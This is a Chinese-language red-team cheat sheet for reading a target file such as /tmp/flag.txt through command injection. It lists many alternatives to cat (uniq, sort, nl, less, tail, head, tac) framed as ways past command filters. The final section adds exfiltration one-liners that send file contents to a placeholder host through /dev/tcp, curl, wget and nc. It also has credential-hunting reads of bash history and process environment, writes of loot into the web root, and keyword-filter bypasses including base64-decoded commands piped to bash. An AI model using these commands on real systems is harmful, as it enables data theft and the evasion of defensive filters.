# uniq命令执行

**uniq** 命令用于去除文本中的重复行，只保留唯一的内容。基本用法为 `uniq filename`，通常与 **sort** 命令结合使用以确保相邻重复行能被识别和移除。  
在安全测试中，**uniq** 可能被用作替代 **cat**、**head** 等命令，帮助攻击者整理和查看文件中的唯一信息。

除此之外还可以使用`grep -n . /tmp/flag.txt` 或`vi /tmp/flag.txt`

```
uniq /tmp/flag.txt
```

红队常用详细指令：

```
uniq /tmp/flag.txt
```

用途：读取文件并去除相邻重复行。

```
sort /tmp/flag.txt | uniq
```

用途：先排序再去重，完整去重读取文件。

```
sort /tmp/flag.txt | uniq -c
```

用途：统计每行出现次数。

```
sort /tmp/flag.txt | uniq -c | sort -nr
```

用途：按出现次数从高到低排序，快速找异常行。

```
uniq -d /tmp/flag.txt
```

用途：只显示重复行。

```
uniq -u /tmp/flag.txt
```

用途：只显示不重复行。

```
uniq -i /tmp/flag.txt
```

用途：忽略大小写去重。

```
uniq -w 10 /tmp/flag.txt
```

用途：只比较每行前 10 个字符去重。

```
uniq -s 5 /tmp/flag.txt
```

用途：跳过每行前 5 个字符后比较去重。

```
uniq -f 2 /tmp/flag.txt
```

用途：跳过每行前 2 个字段后比较去重。

```
cat /tmp/flag.txt | uniq
```

用途：管道读取，绕过只允许 `uniq` 的场景。

```
grep -n . /tmp/flag.txt
```

用途：带行号显示所有非空行，常作为 `cat` 替代。

```
vi /tmp/flag.txt
```

用途：用 `vi` 打开文件，`:set nu` 显示行号，`/flag` 搜索，`:q!` 退出。

# sort命令执行

**sort** 命令用于对文本内容进行排序，使输出内容按照特定规则有序排列。基本用法为 `sort filename`，可以将文件内容按行排序输出。  
在安全测试中，如果 **cat**、**head** 等命令被过滤，攻击者可能使用 **sort** 命令来读取并间接查看文件内容。

```
sort /tmp/flag.txt
```

红队常用详细指令：

```
sort /tmp/flag.txt
```

用途：按行排序输出文件内容。

```
sort -u /tmp/flag.txt
```

用途：排序并去重。

```
sort -r /tmp/flag.txt
```

用途：逆序排序。

```
sort -n /tmp/flag.txt
```

用途：按数字大小排序。

```
sort -nr /tmp/flag.txt
```

用途：按数字逆序排序。

```
sort -k2 /tmp/flag.txt
```

用途：按第 2 列排序。

```
sort -t: -k3 -n /etc/passwd
```

用途：以冒号分隔，按第 3 列 UID 数字排序。

```
sort -o /tmp/out.txt /tmp/flag.txt
```

用途：排序结果写入文件，不直接输出。

```
sort -c /tmp/flag.txt
```

用途：检查文件是否已排序。

```
sort -m file1 file2
```

用途：合并多个已排序文件。

```
sort -z /tmp/flag.txt
```

用途：按 NUL 字符分隔处理。

# nl命令执行

**nl** 命令用于为文件中的每一行加上行号，输出时更加清晰有序。基本用法为 `nl filename`，可以看到每一行前面都有编号。  
在安全测试中，**nl** 一些过滤只限制 **cat**、**head** 等命令的场景下，攻击者可能绕过过滤用 **nl** 来查看敏感文件内容。

```
nl /tmp/flag.txt
```

红队常用详细指令：

```
nl /tmp/flag.txt
```

用途：给非空行加行号输出。

```
nl -ba /tmp/flag.txt
```

用途：给所有行加行号，包括空行。

```
nl -b t /tmp/flag.txt
```

用途：只给非空行加行号，默认行为。

```
nl -n ln /tmp/flag.txt
```

用途：行号左对齐。

```
nl -n rn /tmp/flag.txt
```

用途：行号右对齐，不加前导零。

```
nl -n rz /tmp/flag.txt
```

用途：行号右对齐并补零。

```
nl -w 2 /tmp/flag.txt
```

用途：行号宽度为 2。

```
nl -s ': ' /tmp/flag.txt
```

用途：行号后使用 `:` 分隔。

```
nl -v 0 /tmp/flag.txt
```

用途：行号从 0 开始。

```
nl -i 2 /tmp/flag.txt
```

用途：行号步长为 2。

```
nl -ba /tmp/flag.txt | tail -n 20
```

用途：带行号查看末尾 20 行。

# less命令执行

**less** 是一个高级文件分页查看命令，与 **more** 类似，但功能更强大。使用 `less /etc/passwd` 可以高效阅读大文件，支持向上和向下翻页（用上下箭头或 PageUp/PageDown），按 q 退出。less 支持内容搜索（使用 / 输入关键词）和更灵活的滚动方式。  
在安全实践中，攻击者有时会通过 **less** 去查看敏感文件，因为它比 **more** 更易于浏览和查找关键信息，有些过滤措施可能只防住了 **cat** or **more** 指令，却忽略了 **less**。

```
less /tmp/flag.txt
```

红队常用详细指令：

```
less /tmp/flag.txt
```

用途：分页查看文件。

```
less -N /tmp/flag.txt
```

用途：显示行号。

```
less -S /tmp/flag.txt
```

用途：不自动换行，方便看宽内容。

```
less +/flag /tmp/flag.txt
```

用途：打开后直接搜索 flag。

```
less +F /var/log/auth.log
```

用途：实时跟踪日志，类似 `tail -f`。

```
less -R /tmp/flag.txt
```

用途：显示 ANSI 颜色。

```
less -X /tmp/flag.txt
```

用途：退出后保留屏幕内容。

内部操作：

```
/flag    搜索 flag
n        下一个匹配
N        上一个匹配
g        文件开头
G        文件末尾
q        退出
```

用途：交互式浏览、搜索敏感信息。

# more命令执行

**more** 是另外一个常用的文件查看命令，可以分页浏览内容。当文件内容太长时，使用 `more /etc/passwd` 可以一页一页地查看，非常适合阅读大文件。按下空格可以翻到下一页，按下 q 可以退出查看。  
在安全实践中，**tail** 常用来快速检查日志或文件最新内容，而 **more** 则常用于较长文件的内容查看和浏览。攻击者有时会通过 **tail** 或 **more** 来读取敏感文件，以绕过某些读取限制。

这里分享一个`tee /tmp/flag.txt >> index.php`

```
more /tmp/flag.txt
```

红队常用详细指令：

```
more /tmp/flag.txt
```

用途：分页查看文件。

```
more -n /tmp/flag.txt
```

用途：每屏显示 n 行。

```
more +/flag /tmp/flag.txt
```

用途：从匹配 flag 的位置开始显示。

```
more +10 /tmp/flag.txt
```

用途：从第 10 行开始显示。

```
more -s /tmp/flag.txt
```

用途：压缩连续空行。

```
more -d /tmp/flag.txt
```

用途：显示操作提示。

内部操作：

```
空格     下一页
b        上一页
/flag    搜索
q        退出
```

用途：长文件分页读取和搜索。

```
tee /tmp/flag.txt >> index.php
```

用途：从标准输入读取内容，同时写入 `/tmp/flag.txt` 并追加到 `index.php`，常用于把读取到的内容写入 Web 目录。

# tail命令执行

**tail** 是 Linux 下用于查看文件末尾内容的命令，默认显示最后 10 行。比如：`tail /etc/passwd` 会输出文件的最后 10 行。  
在安全实践中，**tail** 可以用来快速检查日志的最新内容，或者读取大文件的末端。攻击者有时会用 **tail** 来获取敏感文件的结尾信息，以绕过对部分内容的读取限制。

```
tail /tmp/flag.txt
```

红队常用详细指令：

```
tail /tmp/flag.txt
```

用途：默认查看最后 10 行。

```
tail -n 50 /tmp/flag.txt
```

用途：查看最后 50 行。

```
tail -n +1 /tmp/flag.txt
```

用途：从第 1 行输出到末尾，相当于完整读取。

```
tail -c 200 /tmp/flag.txt
```

用途：查看最后 200 字节。

```
tail -f /var/log/auth.log
```

用途：实时监控日志最新内容。

```
tail -F /var/log/auth.log
```

用途：文件轮转后继续跟踪。

```
tail -v /tmp/flag.txt
```

用途：显示文件名头。

```
tail -q /tmp/flag.txt
```

用途：多文件时不显示文件名头。

```
tail -z /tmp/flag.txt
```

用途：按 NUL 分隔读取。

# head命令执行

**head** 是 Linux 下用于查看文件开头内容的命令，默认显示前 10 行。比如：`head /etc/passwd` 会输出文件的前 10 行。  
在安全实践中，**head** 可以用来快速检查大文件的一部分，或者绕过对某些命令（如 **cat**）的限制。攻击者有时会用 **head** 来读取敏感文件的开头内容。

```
head /tmp/flag.txt
```

红队常用详细指令：

```
head /tmp/flag.txt
```

用途：默认查看前 10 行。

```
head -n 50 /tmp/flag.txt
```

用途：查看前 50 行。

```
head -c 200 /tmp/flag.txt
```

用途：查看前 200 字节。

```
head -n -10 /tmp/flag.txt
```

用途：输出除了最后 10 行以外的全部内容。

```
head -c -10 /tmp/flag.txt
```

用途：输出除了最后 10 字节以外的内容。

```
head -q /tmp/flag.txt
```

用途：多文件时不显示文件名头。

```
head -v /tmp/flag.txt
```

用途：显示文件名头。

```
head -z /tmp/flag.txt
```

用途：按 NUL 分隔读取。

# tac命令执行

**tac** 是 Linux 下的一个有趣命令。它和 **cat** 类似，但会将文件内容的每一行倒序输出，最后一行会显示在第一行。比如：`tac /tmp/flag.txt`  
有时候如果服务不允许 **cat** 命令，攻击者会尝试用 **tac**，因为 **tac** 实际上也可以读取文件内容，常用于绕过对 **cat** 命令的限制。

```
tac /tmp/flag.txt
```

红队常用详细指令：

```
tac /tmp/flag.txt
```

用途：按行倒序输出，最后一行变第一行。

```
tac /tmp/flag.txt | head
```

用途：倒序后取前几行，查看原文件末尾内容。

```
tac -s ':' /tmp/flag.txt
```

用途：使用指定分隔符而不是换行符。

```
tac -r -s '[,:]' /tmp/flag.txt
```

用途：使用正则分隔符。

```
tac -b -s ':' /tmp/flag.txt
```

用途：分隔符附加在输出前面。

```
cat /tmp/flag.txt | tac
```

用途：管道倒序读取，绕过只允许 `tac` 的场景。

# cat命令执行

**cat** 是 Linux 下一个常用的命令，用于查看文件内容。例如：`cat /tmp/flag.txt` 可以读取并显示 flag 文件的内容。

```
cat /tmp/flag.txt
```

红队常用详细指令：

```
cat /tmp/flag.txt
```

用途：直接读取 flag。

```
cat -n /tmp/flag.txt
```

用途：带行号读取。

```
cat -b /tmp/flag.txt
```

用途：只给非空行加行号。

```
cat -A /tmp/flag.txt
```

用途：显示不可见字符。

```
cat -E /tmp/flag.txt
```

用途：在每行末尾显示 `$`。

```
cat -T /tmp/flag.txt
```

用途：把 Tab 显示为 `^I`。

```
cat -v /tmp/flag.txt
```

用途：显示非打印字符。

```
cat -s /tmp/flag.txt
```

用途：压缩连续空行。

```
cat /etc/passwd
```

用途：枚举用户。

```
cat ~/.bash_history
```

用途：查看历史命令，找凭据和路径。

```
cat /proc/self/environ | tr '\0' '\n'
```

用途：查看当前进程环境变量。

```
cat /proc/self/cmdline | tr '\0' ' '
```

用途：查看当前进程启动命令。

```
cat /tmp/flag.txt | base64 -w0
```

用途：base64 编码输出，便于外带或绕过过滤。

```
cat /tmp/flag.txt > /var/www/html/flag.txt
```

用途：写入 Web 目录，通过浏览器读取。

```
cat /tmp/flag.txt > /dev/tcp/IP/4444
```

用途：通过 bash 内置 TCP 外带内容。

```
curl -X POST -d @/tmp/flag.txt http://IP:PORT/
```

用途：POST 外带文件内容。

```
curl "http://IP:PORT/?x=$(cat /tmp/flag.txt | base64 -w0)"
```

用途：URL 参数外带，适合无回显。

```
wget --post-file=/tmp/flag.txt http://IP:PORT/
```

用途：wget POST 外带。

```
nc IP 4444 < /tmp/flag.txt
```

用途：TCP 外带。

```
php -r 'echo file_get_contents("/tmp/flag.txt");'
```

用途：PHP 读取文件，绕过系统命令黑名单。

```
python3 -c 'print(open("/tmp/flag.txt").read())'
```

用途：Python 读取文件。

```
perl -ne 'print' /tmp/flag.txt
```

用途：Perl 读取文件。

```
awk '{print}' /tmp/flag.txt
```

用途：逐行输出文件内容。

```
sed -n '1,200p' /tmp/flag.txt
```

用途：输出第 1 到 200 行。

```
grep -n . /tmp/flag.txt
```

用途：带行号显示所有非空行。

```
strings -a /tmp/flag.txt | grep -i flag
```

用途：从二进制或混杂内容中提取字符串。

```
xxd /tmp/flag.txt
```

用途：十六进制查看文件。

```
od -An -tx1 -c /tmp/flag.txt
```

用途：十六进制和字符混合查看。

```
base64 /tmp/flag.txt
```

用途：base64 编码输出。

```
base64 -d /tmp/flag.txt
```

用途：base64 解码。

```
tr -d '\n' < /tmp/flag.txt
```

用途：删除换行，拼成一整行。

```
cat${IFS}/tmp/flag.txt
```

用途：用 `${IFS}` 代替空格，绕过空格过滤。

```
cat</tmp/flag.txt
```

用途：用重定向读取，绕过空格过滤。

```
/bin/c?t /tmp/flag.txt
```

用途：通配符绕过 `cat` 关键字过滤。

```
c'a't /tmp/flag.txt
```

用途：引号拼接绕过 `cat` 关键字过滤。

```
a=c;b=at;$a$b /tmp/flag.txt
```

用途：变量拼接绕过关键字过滤。

```
echo Y2F0IC90bXAvZmxhZy50eHQ= | base64 -d | bash
```

用途：base64 解码后执行，绕过关键字检测。
